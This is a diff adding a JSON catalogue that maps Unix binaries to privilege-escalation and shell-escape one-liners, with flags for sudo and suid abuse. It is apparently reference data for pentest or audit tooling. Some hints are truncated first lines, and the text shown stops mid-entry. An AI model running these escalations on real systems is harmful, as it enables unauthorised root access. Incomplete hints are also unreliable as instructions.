@@ -1,0 +1,3422 @@
+{
+  "7z": {
+    "exploit_hint": "7z a -ttar -an -so /path/to/input-file | 7z e -ttar -si -so",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": false
+  },
+  "aa-exec": {
+    "exploit_hint": "aa-exec /bin/sh",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "agetty": {
+    "exploit_hint": "agetty -l /bin/sh -o -p -a root tty",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": false,
+    "suid": true
+  },
+  "alpine": {
+    "exploit_hint": "alpine -F /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "ansible-playbook": {
+    "exploit_hint": "echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >/path/to/temp-file",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "ansible-test": {
+    "exploit_hint": "ansible-test shell",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "aoss": {
+    "exploit_hint": "aoss /bin/sh",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "apache2": {
+    "exploit_hint": "apache2 -f /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "apache2ctl": {
+    "exploit_hint": "apache2ctl -c 'Include /path/to/input-file'",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": false
+  },
+  "apt-get": {
+    "exploit_hint": "echo 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' >/path/to/temp-file",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "ar": {
+    "exploit_hint": "ar r /path/to/output-file /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "arch-nspawn": {
+    "exploit_hint": "mkdir -p ./etc/",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "aria2c": {
+    "exploit_hint": "aria2c -i /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "arj": {
+    "exploit_hint": "echo DATA >output-file",
+    "file_read": true,
+    "file_write": true,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "arp": {
+    "exploit_hint": "arp -v -f /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "as": {
+    "exploit_hint": "as @/path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "ascii-xfr": {
+    "exploit_hint": "ascii-xfr -ns /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "ascii85": {
+    "exploit_hint": "ascii85 /path/to/input-file | ascii85 --decode",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": false
+  },
+  "ash": {
+    "exploit_hint": "ash -p",
+    "file_read": false,
+    "file_write": true,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "aspell": {
+    "exploit_hint": "aspell -c /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "asterisk": {
+    "exploit_hint": "asterisk -r",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "at": {
+    "exploit_hint": "echo \"/bin/sh <$(tty) >$(tty) 2>$(tty)\" | at now; tail -f /dev/null",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "atobm": {
+    "exploit_hint": "atobm /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "autoconf": {
+    "exploit_hint": "echo /bin/sh >/path/to/temp-file",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "autoheader": {
+    "exploit_hint": "echo '/bin/sh 1>&0' >/path/to/temp-file",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "autoreconf": {
+    "exploit_hint": "echo '/bin/sh 1>&0' >/path/to/temp-file",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "aws": {
+    "exploit_hint": "aws ec2 describe-instances --filter file:///path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "base32": {
+    "exploit_hint": "base32 /path/to/input-file | base32 --decode",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "base58": {
+    "exploit_hint": "base58 /path/to/input-file | base58 --decode",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": false
+  },
+  "base64": {
+    "exploit_hint": "base64 /path/to/input-file | base64 --decode",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "basenc": {
+    "exploit_hint": "basenc --base64 /path/to/input-file | basenc -d --base64",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "basez": {
+    "exploit_hint": "basez /path/to/input-file | basez --decode",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "bash": {
+    "exploit_hint": "bash -p",
+    "file_read": true,
+    "file_write": true,
+    "library_load": true,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "bbot": {
+    "exploit_hint": "bbot -d -cy /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": false
+  },
+  "bc": {
+    "exploit_hint": "bc -s /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "bconsole": {
+    "exploit_hint": "bconsole",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "borg": {
+    "exploit_hint": "borg extract @:/::: --rsh \"/bin/sh -c '/bin/sh </dev/tty >/dev/tty 2>/dev/tty'\"",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "bpftrace": {
+    "exploit_hint": "bpftrace --unsafe -e 'BEGIN {system(\"/bin/sh 1<&0\");exit()}'",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "bridge": {
+    "exploit_hint": "bridge -b /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "bundle": {
+    "exploit_hint": "BUNDLE_GEMFILE=x bundle exec /bin/sh",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "busctl": {
+    "exploit_hint": "busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "bzip2": {
+    "exploit_hint": "bzip2 -c /path/to/input-file | bzip2 -d",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "cabal": {
+    "exploit_hint": "cabal exec --project-file=/dev/null -- /bin/sh -p",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "capsh": {
+    "exploit_hint": "capsh --gid=0 --uid=0 --",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "cat": {
+    "exploit_hint": "cat /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "cdist": {
+    "exploit_hint": "cdist shell -s /bin/sh",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "certbot": {
+    "exploit_hint": "certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir . --work-dir . --config-dir . --pre-hook '/bin/sh 1>&0 2>&0'",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "check_by_ssh": {
+    "exploit_hint": "check_by_ssh -o \"ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)\" -H localhost -C x",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "check_cups": {
+    "exploit_hint": "check_cups --extra-opts=@/path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": false
+  },
+  "check_log": {
+    "exploit_hint": "check_log -F /path/to/input-file -O /path/to/output-file",
+    "file_read": true,
+    "file_write": true,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": false
+  },
+  "check_memory": {
+    "exploit_hint": "check_memory --extra-opts=@/path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": false
+  },
+  "check_raid": {
+    "exploit_hint": "check_raid --extra-opts=@/path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": false
+  },
+  "check_ssl_cert": {
+    "exploit_hint": "echo 'exec /bin/sh 0<&2 1>&2' >/path/to/temp-file",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "check_statusfile": {
+    "exploit_hint": "check_statusfile /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": false
+  },
+  "choom": {
+    "exploit_hint": "choom -n 0 -- /bin/sh -p",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "chroot": {
+    "exploit_hint": "chroot / /bin/sh -p",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "chrt": {
+    "exploit_hint": "chrt 1 /bin/sh -p",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "clamscan": {
+    "exploit_hint": "touch x.yara",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "clisp": {
+    "exploit_hint": "clisp -x '(ext:run-shell-command \"/bin/sh\")(ext:exit)'",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "cmake": {
+    "exploit_hint": "echo 'execute_process(COMMAND /bin/sh)' >/path/to/CMakeLists.txt",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "cmp": {
+    "exploit_hint": "cmp /path/to/input-file /dev/zero -b -l",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "cobc": {
+    "exploit_hint": "echo 'CALL \"SYSTEM\" USING \"/bin/sh\".' >/path/to/temp-file",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "codex": {
+    "exploit_hint": "codex sandbox linux /bin/sh",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "column": {
+    "exploit_hint": "column /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "comm": {
+    "exploit_hint": "comm /path/to/input-file /dev/null",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "composer": {
+    "exploit_hint": "echo '{\"scripts\":{\"x\":\"/bin/sh\"}}' >composer.json",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "cp": {
+    "exploit_hint": "echo DATA | cp /dev/stdin /path/to/output-file",
+    "file_read": true,
+    "file_write": true,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "cpio": {
+    "exploit_hint": "echo '/bin/sh </dev/tty >/dev/tty' >localhost",
+    "file_read": true,
+    "file_write": true,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "cpulimit": {
+    "exploit_hint": "cpulimit -l 100 -f -- /bin/sh -p",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "csh": {
+    "exploit_hint": "csh -b",
+    "file_read": false,
+    "file_write": true,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "csplit": {
+    "exploit_hint": "echo DATA >/path/to/temp-file",
+    "file_read": true,
+    "file_write": true,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "csvtool": {
+    "exploit_hint": "csvtool call '/bin/sh;false' /etc/hosts",
+    "file_read": true,
+    "file_write": true,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "ctr": {
+    "exploit_hint": "ctr run --rm --mount type=bind,src=/,dst=/,options=rbind -t docker.io/library/alpine:latest x",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "cupsfilter": {
+    "exploit_hint": "cupsfilter -i application/octet-stream -m application/octet-stream /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "curl": {
+    "exploit_hint": "echo DATA >/path/to/temp-file",
+    "file_read": true,
+    "file_write": true,
+    "library_load": true,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "cut": {
+    "exploit_hint": "cut -d '' -f1 /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "dash": {
+    "exploit_hint": "dash",
+    "file_read": false,
+    "file_write": true,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "date": {
+    "exploit_hint": "date -f /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "dc": {
+    "exploit_hint": "dc -e '!/bin/sh'",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "dd": {
+    "exploit_hint": "echo DATA | dd of=/path/to/output-file",
+    "file_read": true,
+    "file_write": true,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "debugfs": {
+    "exploit_hint": "debugfs",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "dhclient": {
+    "exploit_hint": "dhclient -sf /bin/sh",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "dialog": {
+    "exploit_hint": "dialog --textbox /path/to/input-file 0 0",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "diff": {
+    "exploit_hint": "diff --line-format=%L /dev/null /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "dig": {
+    "exploit_hint": "dig -f /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "distcc": {
+    "exploit_hint": "distcc /bin/sh -p",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "dmesg": {
+    "exploit_hint": "dmesg -rF /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "dmsetup": {
+    "exploit_hint": "dmsetup create base <<EOF",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "doas": {
+    "exploit_hint": "doas -u root /bin/sh",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "docker": {
+    "exploit_hint": "docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh",
+    "file_read": true,
+    "file_write": true,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "dos2unix": {
+    "exploit_hint": "dos2unix -f -n /path/to/input-file /path/to/output-file",
+    "file_read": true,
+    "file_write": true,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "dosbox": {
+    "exploit_hint": "dosbox -c 'mount c /' -c \"echo DATA >c:\\path\\to\\output\" -c exit",
+    "file_read": true,
+    "file_write": true,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "dotnet": {
+    "exploit_hint": "dotnet fsi",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "dpkg": {
+    "exploit_hint": "dpkg -i x_1.0_all.deb",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "dvips": {
+    "exploit_hint": "dvips -R0 texput.dvi",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "easyrsa": {
+    "exploit_hint": "echo 'set_var X \"$(/bin/sh 1>&0)\"' >/path/to/temp-file",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "ed": {
+    "exploit_hint": "ed",
+    "file_read": true,
+    "file_write": true,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "efax": {
+    "exploit_hint": "efax -d /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "egrep": {
+    "exploit_hint": "grep '' /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "elvish": {
+    "exploit_hint": "elvish",
+    "file_read": true,
+    "file_write": true,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "emacs": {
+    "exploit_hint": "emacs -Q -nw --eval '(term \"/bin/sh\")'",
+    "file_read": true,
+    "file_write": true,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "enscript": {
+    "exploit_hint": "enscript /dev/null -qo /dev/null -I '/bin/sh >&2'",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "env": {
+    "exploit_hint": "env /bin/sh -p",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "eqn": {
+    "exploit_hint": "eqn /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "espeak": {
+    "exploit_hint": "espeak -qXf /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "ex": {
+    "exploit_hint": "ex -c ':!/bin/sh'",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "exiftool": {
+    "exploit_hint": "exiftool -filename=/path/to/output-file /path/to/input-file",
+    "file_read": true,
+    "file_write": true,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": false
+  },
+  "expand": {
+    "exploit_hint": "expand /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "expect": {
+    "exploit_hint": "expect -c 'spawn /bin/sh -p;interact'",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "fastfetch": {
+    "exploit_hint": "echo '{\"modules\":[{\"type\":\"command\",\"key\":\"x\",\"text\":\"exec /bin/sh 1>&0 2>&0\"}]}' >/path/to/temp-file.jsonc",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "ffmpeg": {
+    "exploit_hint": "ffmpeg -f lavfi -i anullsrc -af ladspa=file=/path/to/lib.so /path/to/temp-file.wav",
+    "file_read": false,
+    "file_write": false,
+    "library_load": true,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "fgrep": {
+    "exploit_hint": "grep '' /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "file": {
+    "exploit_hint": "file -f /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "find": {
+    "exploit_hint": "find . -exec /bin/sh -p \\; -quit",
+    "file_read": true,
+    "file_write": true,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "firejail": {
+    "exploit_hint": "firejail /bin/sh",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "fish": {
+    "exploit_hint": "fish",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "flock": {
+    "exploit_hint": "flock -u / /bin/sh -p",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "fmt": {
+    "exploit_hint": "fmt -pNON_EXISTING_PREFIX /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "fold": {
+    "exploit_hint": "fold -w999 /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "forge": {
+    "exploit_hint": "echo '#!/bin/sh' >/path/to/temp-file",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "fping": {
+    "exploit_hint": "fping -f /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "ftp": {
+    "exploit_hint": "ftp",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "fzf": {
+    "exploit_hint": "fzf --bind 'enter:execute(/bin/sh)'",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "gawk": {
+    "exploit_hint": "gawk 'BEGIN {system(\"/bin/sh\")}'",
+    "file_read": true,
+    "file_write": true,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "gcc": {
+    "exploit_hint": "gcc -wrapper /bin/sh,-s x",
+    "file_read": true,
+    "file_write": true,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "gcore": {
+    "exploit_hint": "gcore $PID",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "gdb": {
+    "exploit_hint": "gdb -nx -ex '!/bin/sh' -ex quit",
+    "file_read": false,
+    "file_write": true,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "gem": {
+    "exploit_hint": "gem open -e '/bin/sh -s' debug",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "genie": {
+    "exploit_hint": "genie -c '/bin/sh'",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "genisoimage": {
+    "exploit_hint": "genisoimage -q -o - /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "ghc": {
+    "exploit_hint": "ghc -e 'System.Process.callCommand \"/bin/sh\"'",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "ghci": {
+    "exploit_hint": "ghci",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "ginsh": {
+    "exploit_hint": "ginsh",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "git": {
+    "exploit_hint": "ln -s /bin/sh git-x",
+    "file_read": true,
+    "file_write": true,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "gnuplot": {
+    "exploit_hint": "gnuplot -e 'system(\"/bin/sh 1>&0\")'",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "go": {
+    "exploit_hint": "echo -e 'package main\\nimport \"syscall\"\\nfunc main(){\\n\\tsyscall.Exec(\"/bin/sh\", []string{\"/bin/sh\", \"-i\"}, []string{})\\n}' >/path/to/temp-file.go",
+    "file_read": true,
+    "file_write": true,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "grc": {
+    "exploit_hint": "grc --pty /bin/sh",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": false
+  },
+  "grep": {
+    "exploit_hint": "grep '' /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "gtester": {
+    "exploit_hint": "echo '#!/bin/sh -p' >/path/to/temp-file",
+    "file_read": false,
+    "file_write": true,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "guile": {
+    "exploit_hint": "guile -c '(system \"/bin/sh\")'",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "hashcat": {
+    "exploit_hint": "echo -n DATA | tee /path/to/wordlist | md5sum | awk '{print $1}' >/path/to/hash",
+    "file_read": false,
+    "file_write": true,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": false
+  },
+  "head": {
+    "exploit_hint": "head -c-0 /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "hexdump": {
+    "exploit_hint": "hd /path/to/input-file",
+    "file_read": true,
+    "file_write": false,
+    "library_load": false,
+    "shell": false,
+    "sudo": true,
+    "suid": true
+  },
+  "hg": {
+    "exploit_hint": "hg --config alias.x='!/bin/sh' x",
+    "file_read": false,
+    "file_write": false,
+    "library_load": false,
+    "shell": true,
+    "sudo": true,
+    "suid": true
+  },
+  "highlight": {
+    "exploit_hint": "highlight --no-doc --failsafe /path/to/input-file",
